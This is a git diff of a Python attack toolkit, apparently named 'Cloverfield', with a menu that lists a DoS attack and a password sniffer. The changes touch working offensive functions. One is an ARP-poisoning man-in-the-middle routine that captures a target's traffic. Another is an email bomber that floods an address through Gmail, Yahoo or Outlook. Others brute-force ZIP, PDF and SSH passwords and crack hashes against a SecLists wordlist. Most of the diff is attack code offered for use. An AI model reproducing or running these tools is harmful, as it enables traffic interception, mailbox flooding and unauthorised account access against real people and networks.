@@ -1,36 +1,25 @@
-import os
-import sys
-import time
-import socket
-import random
 import paramiko
-import re, requests
-import multiprocessing, netaddr, argparse, logging
-from datetime import datetime
-import subprocess
-from urllib.request import Request, urlopen
-from bs4 import BeautifulSoup
+import requests
+import multiprocessing
+import netaddr
+from urllib.request import urlopen
 import requests.exceptions
 import zipfile
-from urllib.parse import urlsplit
-from urllib.parse import urlparse
 import requests.exceptions
 from urllib.parse import urlsplit
-from collections import deque
 from bs4 import BeautifulSoup
 from getmac import get_mac_address
-from time import sleep
 import smtplib
-import subprocess
 from urllib import parse
-import hashlib, bcrypt
+import hashlib
 import pikepdf
-from termcolor import colored
 from colorama import *
 from scapy.all import *
+from scapy.layers.inet import ICMP, TCP
+from scapy.layers.l2 import Ether, ARP
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 conf.verb = 0
-
 
 ################################################################################################################
 
@@ -69,9 +58,7 @@ def DoSAttack():
         print("")
         init()
 
-
 ################################################################################################################
-
 
 def WebScraper():
     class RegEx:
@@ -139,9 +126,7 @@ def WebScraper():
         main(url, action)
         init()
 
-
 ################################################################################################################
-
 
 def HostDiscovery():
     class const:
@@ -317,72 +302,77 @@ def MITMTool():
 
     def arpPoison(gateIp, gateMac, targetIp, targetMac):
         try:
-            while True:
-                try:
-                    print("[*] ARP poisoning [CTRL-C to stop]")
-                    send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=targetMac))
-                    send(ARP(op=2, psrc=targetIP, pdst=gateIp, hwdst=gateMac))
-                    time.sleep(2)
-                except KeyboardInterrupt:
-                    pass
+            if(gateIp != None and gateMac != None and targetIp != None and targetMac != None and gateIp != "" and gateMac != "" and targetIp != "" and targetMac != ""):
+                while True:
+                    try:
+                        print("[*] ARP poisoning [CTRL-C to stop]")
+                        send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=targetMac))
+                        send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst=gateMac))
+                        time.sleep(2)
+                    except:
+                        init()
+                        break
+            else:
+                print("INVALID PARAMETER INPUTS")
+                init()
         except:
             print("arp poisoning error...")
-            init()
-
+            #init()
 
     def arpRestore(gateIp, gateMac, targetIp, targetMac):
         try:
             for x in range(5):
                 print("[*] Restoring ARP table [" + str(x) + " of 4]")
-                send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=bcast, hwsrc=gateMac), count=5)
-                send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst=bcast, hwsrc=targetMac), count=5)
+                send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMac), count=5)
+                send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMac), count=5)
                 time.sleep(2)
         except:
             print("arp restore error...")
-            init()
+            #init()
+
 
     def start():
-        try:
-            conf.iface = interface
-            conf.verb = 0
-            gateMac = ip2mac(gateIP)
-            targetMac = ip2mac(targetIP)
-            print("[*] Interface: " + interface)
-            print("[*] Gateway: " + gateIP + " [" + gateMac + "]")
-            print("[*] Target: " + targetIP + " [" + targetMac + "]")
-            print("[*] Enabling Packet Forwarding")
-            os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
 
-            p = multiprocessing.Process(target=arpPoison, args=(gateIP, gateMac, targetIP, targetMac,))
-            p.start()
-
-            print("[*] Sniffing Packets")
-            packets = sniff(count=packets, filter=("ip host " + targetIP), iface=interface)
-            wrpcap(logfile, packets)
-            p.terminate()
-            print("[*] Sniffing Complete")
-
-            print("[*] Disable Packet Forwarding")
-            os.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
-            arpRestore(gateIP, gateMac, targetIP, targetMac)
-            print("[*] Exiting")
-            init()
-        except:
-            print("...")
-            init()
-
-    try:
         interface = input("INTERFACE (example : eth0) : ")
         targetIP = input("TARGET IP (example : 10.2.1.16) : ")
         gateIP = input("GATEWAY (example : 10.2.1.1) : ")
+
         packets = 99999
         logfile = "mitmLogCloverfield.pcap"
         bcast = "ff:ff:ff:ff:ff:ff"
+
+        conf.iface = interface
+        conf.verb = 0
+        gateMac = ip2mac(gateIP)
+        targetMac = ip2mac(targetIP)
+        print("[*] Interface: " + interface)
+        print("[*] Gateway: " + gateIP + " [" + gateMac + "]")
+        print("[*] Target: " + targetIP + " [" + targetMac + "]")
+        print("[*] Enabling Packet Forwarding")
+        os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
+
+        p = multiprocessing.Process(target=arpPoison, args=(gateIP, gateMac, targetIP, targetMac,))
+        p.start()
+
+        print("[*] Sniffing Packets")
+        packets = sniff(count=packets, filter=("ip host " + targetIP), iface=interface)
+        wrpcap(logfile, packets)
+        p.terminate()
+        print("[*] Sniffing Complete")
+
+        print("[*] Disable Packet Forwarding")
+        os.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
+        arpRestore(gateIP, gateMac, targetIP, targetMac)
+        print("[*] Exiting")
+        init()
+
+
+
+    try:
         start()
     except:
         print("an error occured...")
         init()
-
 ################################################################################################################
 
 def WebServerDirAndFileEnumerator():
@@ -526,9 +516,11 @@ def EmailBomber():
                     input('CHOOSE AN OPTION : \n1 - 1000 \n2 - 500 \n3 - 250 \n4 - CUSTOM AMOUNT \n'))
                 if int(self.mode) > int(4) or int(self.mode) < int(1):
                     print('INVALID OPTION')
-                    sys.exit(1)
+                    init()
             except Exception as e:
+                print("")
                 print("an error occured...")
+                print("")
                 init()
 
         def bomb(self):
@@ -546,13 +538,15 @@ def EmailBomber():
                 print(
                     f'\nYOU HAVE CHOSEN OPTION : {self.mode} AND {self.amount} AMOUNT OF EMAIL(S) TO SEND')
             except Exception as e:
-                print(f'ERROR: {e}')
+                print("")
+                print('an error occured...')
+                print("")
+                init()
 
         def email(self):
             try:
                 print('\nSETTING UP EMAAIL...')
-                self.server = str(input(
-                    'ENTER EMAIL SERVER OR CHOOSE AN OPTION :  \n1:GMAIL \n2:YAHOO \n3:Outlook \n'))
+                self.server = str(input('ENTER EMAIL SERVER OR CHOOSE AN OPTION :  \n1:GMAIL \n2:YAHOO \n3:Outlook \n'))
                 premade = ['1', '2', '3']
                 default_port = True
                 if self.server not in premade:
@@ -583,29 +577,42 @@ def EmailBomber():
                 self.s.ehlo()
                 self.s.login(self.fromAddr, self.fromPwd)
             except Exception as e:
-                print(f'ERROR: {e}')
+                print("")
+                print('an error occured...')
+                print("")
+                init()
 
         def send(self):
             try:
                 self.s.sendmail(self.fromAddr, self.target, self.msg)
-                self.count += 1
                 print(f'BOMB: {self.count}')
+                self.count += 1
             except Exception as e:
-                print(f'ERROR: {e}')
+                print("")
+                print('an error occured...')
+                print("")
+                init()
+
 
         def attack(self):
-            print('\nAttacking...')
-            for email in range(self.amount + 1):
+            print('\nATTACKING...')
+            for email in range(self.amount):
                 self.send()
             self.s.close()
-            print('\nAttack finished')
-            sys.exit(0)
+            print('\nATTACK FINISHED')
+            init()
 
-    if __name__ == '__main__':
+
+    try:
         bomb = Email_Bomber()
         bomb.bomb()
         bomb.email()
         bomb.attack()
+    except:
+        print("")
+        print("an error occured...")
+        print("")
+        init()
 
 ################################################################################################################
 
@@ -620,7 +627,8 @@ def BruteforcePasswordCracker():
             for x in range(current):
                 a = [y + i for i in charlist for y in a]
             complete = complete + a
-        z = zipfile.ZipFile('/home/arafa/secret.zip')
+        zipLoc = input("PATH TO ZIP FILE : ")
+        z = zipfile.ZipFile(zipLoc)
         tries = 0
 
         for passwd in complete:
@@ -629,13 +637,14 @@ def BruteforcePasswordCracker():
                 z.setpassword(passwd.encode('ascii'))
                 z.extractall()
                 print(f'Password was found after {tries} tries ! The password is : {passwd}')
-                break
+                init()
             except:
                 print("Trying...")
                 pass
 
     def ZIPCRACKBYFILE():
-        z = zipfile.ZipFile('/home/arafa/secret.zip')
+        zipLoc = input("PATH TO ZIP FILE : ")
+        z = zipfile.ZipFile(zipLoc)
         tries = 0
         LIST_OF_COMMON_PASSWORDS = str(urlopen(
             'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
@@ -646,7 +655,7 @@ def BruteforcePasswordCracker():
                 z.setpassword(guess.encode('utf-8'))
                 z.extractall()
                 print(f'Password was found after {tries} tries ! The password is : {guess}')
-                break
+                init()
             except:
                 print("Trying...")
                 pass
@@ -654,6 +663,7 @@ def BruteforcePasswordCracker():
     def PDFCRACK(r):
         charlist = 'abcdefghijklmnopqrstuvwxyz1234567890é@?!çà"§$'
         complete = []
+        pdfPath = input("PATH TO PDF FILE : ")
 
         for current in range(r):
             a = [i for i in charlist]
@@ -665,24 +675,33 @@ def BruteforcePasswordCracker():
         for passwd in complete:
             try:
                 tries += 1
-                pikepdf.open("/home/arafa/Documenten/aa.pdf",passwd.strip())
-                print(f'Password was found after {tries} tries ! The password is : {passwd}')
-                break
+                if (os.path.isfile(pdfPath) and pdfPath[-3:] == "pdf"):
+                    pikepdf.open(pdfPath,passwd.strip())
+                    print(f'Password was found after {tries} tries ! The password is : {passwd}')
+                    init()
+                else:
+                    print("NOT FOUND")
+                    init()
             except:
                 print("Trying...")
                 pass
 
     def PDFCRACKBYFILE():
         tries = 0
+        pdfPath = input("PATH TO PDF FILE : ")
         LIST_OF_COMMON_PASSWORDS = str(urlopen(
             'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),
                                        'utf-8')
         for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
             try:
                 tries +=1
-                pikepdf.open("/home/arafa/Documenten/aa.pdf",guess.strip())
-                print(f'Password was found after {tries} tries ! The password is : {guess}')
-                break
+                if (os.path.isfile(pdfPath) and pdfPath[-3:] == "pdf"):
+                    pikepdf.open(pdfPath,guess.strip())
+                    print(f'Password was found after {tries} tries ! The password is : {guess}')
+                    init()
+                else:
+                    print("NOT FOUND")
+                    init()
             except:
                 print("Trying...")
                 pass
@@ -723,12 +742,14 @@ def BruteforcePasswordCracker():
                     print("FOUND PASSWORD : ", passwd, "\nFOR ACCOUNT : ", username)
                     print("")
                     print(f'Password was found after {tries} tries ! The password is : {passwd}')
+                    init()
                     break
                 elif resp == 1:
                     print("INCORRECT LOGIN : " + passwd)
                 elif resp == 2:
                     print("CAN'T ESTABLISH CONNECTION")
-                    sys.exit(1)
+                    init()
+                    break
             except:
                 print("Trying...")
                 pass
@@ -737,7 +758,6 @@ def BruteforcePasswordCracker():
         def ssh_connect(password,code=0):
             SSH = paramiko.SSHClient()
             SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
             try:
                 SSH.connect(host, port=22, username=username, password=password)
             except paramiko.AuthenticationException:
@@ -750,7 +770,7 @@ def BruteforcePasswordCracker():
 
         host = input("TARGET IP : ")
         username = input("SSH USERNAME : ")
-        file = input("PASSWORD FILE : ")
+        file = input("PASSWORD FILE PATH : ")
 
         def func():
 
@@ -767,49 +787,71 @@ def BruteforcePasswordCracker():
                         if resp == 0:
                             print("")
                             print("FOUND PASSWORD : " , password, "\nFOR ACCOUNT : " , username)
+                            init()
                             break
                         elif resp == 1:
                             print("INCORRECT LOGIN : " + password)
                         elif resp == 2:
                             print("CAN'T ESTABLISH CONNECTION")
-                            sys.exit(1)
+                            init()
+                            break
                     except Exception as e:
                         print(e)
                         pass
 
         func()
+    try:
+        opt = int(input("CHOOSE AN OPTION \n1 - ZIP PASSWORD CRACK \n2 - PDF PASSWORD CRACK \n3 - SSH PASSWORD CRACK \n"))
+        if(opt == 1):
+            choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
+            if(choose == 1):
+                r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
+                if(r > 0):
+                    ZIPCRACK(r)
+                else:
+                    print("INVALID OPTION")
+                    init()
+            elif(choose == 2):
+                ZIPCRACKBYFILE()
+            else:
+                print("INVALID OPTION")
+                init()
+        elif(opt ==2):
+            choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
+            if (choose == 1):
+                r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
+                if(r > 0):
+                    PDFCRACK(r)
+                else:
+                    print("INVALID OPTION")
+                    init()
+            elif (choose == 2):
+                PDFCRACKBYFILE()
+            else:
+                print("INVALID OPTION")
+                init()
+        elif(opt == 3):
+            choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
+            if (choose == 1):
+                r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
+                if(r > 0):
+                    SSHCRACK(r)
+                else:
+                    print("INVALID OPTION")
+                    init()
+            elif (choose == 2):
+                SSHCRACKBYFILE()
+            else:
+                print("INVALID OPTION")
+                init()
+        else:
+            print("INVALID OPTION")
+            init()
+    except:
+        print("an error occured...")
+        init()
 
-
-    opt = int(input("CHOOSE AN OPTION \n1 - ZIP PASSWORD CRACK \n2 - PDF PASSWORD CRACK \n3 - SSH PASSWORD CRACK \n"))
-    if(opt == 1):
-        choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
-        if(choose == 1):
-            r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
-            ZIPCRACK(r)
-        elif(choose == 2):
-            ZIPCRACKBYFILE()
-        else:
-            print("INVALID OPTION")
-    elif(opt ==2):
-        choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
-        if (choose == 1):
-            r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
-            PDFCRACK(r)
-        elif (choose == 2):
-            PDFCRACKBYFILE()
-        else:
-            print("INVALID OPTION")
-    elif(opt == 3):
-        choose = int(input("CHOOSE OPTION : \n1 - BRUTEFORCE BY STANDARD LOOPING \n2 - BRUTEFORCE BY WORDLIST FILE \n"))
-        if (choose == 1):
-            r = int(input("CHOOSE RANGE OF WORDS TO BRUTEFORCE (AMOUNTS ABOVE 4 REQUIRE HEAVY PROCESSING) : "))
-            SSHCRACK(r)
-        elif (choose == 2):
-            SSHCRACKBYFILE()
-        else:
-            print("INVALID OPTION")
-    else:
-        print("INVALID OPTION")
+################################################################################################################
 
 def PasswordEncodeDecode():
     def SHA1(password):
@@ -855,46 +897,64 @@ def PasswordEncodeDecode():
         encoded = hash_obj.hexdigest()
         print(encoded)
 
-
     def PasswordEncoder():
         option = int(input("CHOOSE HASHING OPTION \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n7 - ALL \n"))
-        password = input("INPUT PASSWORD TO HASH : ")
-        if(option ==1):
-            SHA1(password)
-        elif(option == 2):
-            MD5(password)
-        elif(option == 3):
-            SHA256(password)
-        elif(option == 4):
-            SHA512(password)
-        elif(option == 5):
-            SHA224(password)
-        elif(option == 6):
-            SHA384(password)
-        elif(option == 7):
-            SHA1(password)
-            SHA224(password)
-            SHA256(password)
-            SHA512(password)
-            SHA384(password)
-            MD5(password)
+        if(option < 8 and option > 0):
+            password = input("INPUT PASSWORD TO HASH : ")
         else:
-            print("INVALID INPUT")
+            print("INVALID OPTION")
+            init()
+        if(password != None and password != ""):
+            if(option ==1):
+                SHA1(password)
+                init()
+            elif(option == 2):
+                MD5(password)
+                init()
+            elif(option == 3):
+                SHA256(password)
+                init()
+            elif(option == 4):
+                SHA512(password)
+                init()
+            elif(option == 5):
+                SHA224(password)
+                init()
+            elif(option == 6):
+                SHA384(password)
+                init()
+            elif(option == 7):
+                SHA1(password)
+                SHA224(password)
+                SHA256(password)
+                SHA512(password)
+                SHA384(password)
+                MD5(password)
+                init()
+            else:
+                print("INVALID INPUT")
+                init()
+        else:
+            print("INVALID INPUT IS EMPTY")
+            init()
 
     def PasswordDecoder():
+
         def SHA1(password):
             print("")
             print("SHA1 DECODER")
             LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
+
                 if hashedGuess == password:
-                    print("The password is ", str(guess))
-                    quit()
+                    print("THE PASSWORD IS :  ", str(guess))
+                    init()
                 elif hashedGuess != password:
                     print("Password guess ", str(guess)," does not match, trying next...")
             print("")
-            print("Password not in collection or wrong hash option")
+            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
+            init()
 
         def MD5(password):
             print("")
@@ -904,13 +964,15 @@ def PasswordEncodeDecode():
                                            'utf-8')
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 hashedGuess = hashlib.md5(bytes(guess, 'utf-8')).hexdigest()
+
                 if hashedGuess == password:
-                    print("The password is ", str(guess))
-                    quit()
+                    print("THE PASSWORD IS :  ", str(guess))
+                    init()
                 elif hashedGuess != password:
                     print("Password guess ", str(guess), " does not match, trying next...")
             print("")
-            print("Password not in collection or wrong hash option")
+            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
+            init()
 
         def SHA256(password):
             print("")
@@ -920,13 +982,15 @@ def PasswordEncodeDecode():
                                            'utf-8')
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 hashedGuess = hashlib.sha256(bytes(guess, 'utf-8')).hexdigest()
+
                 if hashedGuess == password:
-                    print("The password is ", str(guess))
-                    quit()
+                    print("THE PASSWORD IS :  ", str(guess))
+                    init()
                 elif hashedGuess != password:
                     print("Password guess ", str(guess), " does not match, trying next...")
             print("")
-            print("Password not in collection or wrong hash option")
+            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
+            init()
 
         def SHA512(password):
             print("")
@@ -937,12 +1001,13 @@ def PasswordEncodeDecode():
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 hashedGuess = hashlib.sha512(bytes(guess, 'utf-8')).hexdigest()
                 if hashedGuess == password:
-                    print("The password is ", str(guess))
-                    quit()
+                    print("THE PASSWORD IS :  ", str(guess))
+                    init()
                 elif hashedGuess != password:
                     print("Password guess ", str(guess), " does not match, trying next...")
             print("")
-            print("Password not in collection or wrong hash option")
+            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
+            init()
 
         def SHA224(password):
             print("")
@@ -953,12 +1018,13 @@ def PasswordEncodeDecode():
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 hashedGuess = hashlib.sha224(bytes(guess, 'utf-8')).hexdigest()
                 if hashedGuess == password:
-                    print("The password is ", str(guess))
-                    quit()
+                    print("THE PASSWORD IS :  ", str(guess))
+                    init()
                 elif hashedGuess != password:
                     print("Password guess ", str(guess), " does not match, trying next...")
             print("")
-            print("Password not in collection or wrong hash option")
+            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
+            init()
 
         def SHA384(password):
             print("")
@@ -969,38 +1035,50 @@ def PasswordEncodeDecode():
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 hashedGuess = hashlib.sha384(bytes(guess, 'utf-8')).hexdigest()
                 if hashedGuess == password:
-                    print("The password is ", str(guess))
-                    quit()
+                    print("THE PASSWORD IS :  ", str(guess))
+                    init()
                 elif hashedGuess != password:
                     print("Password guess ", str(guess), " does not match, trying next...")
             print("")
-            print("Password not in collection or wrong hash option")
+            print("PASSWORD NOT IN COLLECTION OR WRONG HASH OPTION")
+            init()
 
-        option = int(input("CHOOSE DECODING OPTION \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n"))
-        password = input("INPUT HASH TO CRACK : ")
-        if (option == 1):
-            SHA1(password)
-        elif (option == 2):
-            MD5(password)
-        elif (option == 3):
-            SHA256(password)
-        elif (option == 4):
-            SHA512(password)
-        elif (option == 5):
-            SHA224(password)
-        elif (option == 6):
-            SHA384(password)
+        option = int(input("CHOOSE DECODING OPTION (BASED ON ONLINE FILE WITH 10.000 PASSWORDS) \n1 - SHA1 \n2 - MD5 \n3 - SHA256 \n4 - SHA512 \n5 - SHA224 \n6 - SHA384 \n"))
+
+        if(option > 0 and option < 7):
+            password = input("INPUT HASH TO CRACK : ")
+            if (option == 1):
+                SHA1(password)
+            elif (option == 2):
+                MD5(password)
+            elif (option == 3):
+                SHA256(password)
+            elif (option == 4):
+                SHA512(password)
+            elif (option == 5):
+                SHA224(password)
+            elif (option == 6):
+                SHA384(password)
+            else:
+                print("INVALID INPUT")
+                init()
         else:
-            print("INVALID INPUT")
-    print("WELCOME TO PASSWORD ENCODER/DECODER")
-    print("")
-    opt = int(input("CHOOSE AN OPTION (1 - ENCODE, 2 - DECODE) : "))
-    if(opt == 1):
-        PasswordEncoder()
-    elif(opt == 2):
-        PasswordDecoder()
-    else:
-        print("INVALID OPTION")
+            print("INVALID OPTION")
+            init()
+
+    try:
+        print("WELCOME TO PASSWORD ENCODER/DECODER")
+        print("")
+        opt = int(input("CHOOSE AN OPTION (1 - ENCODE, 2 - DECODE) : "))
+        if(opt == 1):
+            PasswordEncoder()
+        elif(opt == 2):
+            PasswordDecoder()
+        else:
+            print("INVALID OPTION")
+    except:
+        print("an error occured...")
+        init()
 
 ################################################################################################################
 
@@ -1037,11 +1115,12 @@ def PasswordSnif():
                 pass
 
     try:
-        print("Sniffing...")
+        print("Sniffing... (Ctrl+c to exit program)")
         sniff(iface=iface, prn=pkt_parser,store=0)
     except KeyboardInterrupt:
         print("Exiting...")
-        exit(0)
+        init()
+
 
 ################################################################################################################
 
@@ -1076,6 +1155,7 @@ def init():
            |___ |___ |__|  \/  |___ |  \ |    | |___ |___ |__/ 
            Author : Arafa Yoncalik                                               
     """)
+
     print(Style.RESET_ALL)
     print(Fore.RED +"1 - DOS ATTACK")
     print(Fore.LIGHTRED_EX +"2 - WEB SCRAPER")
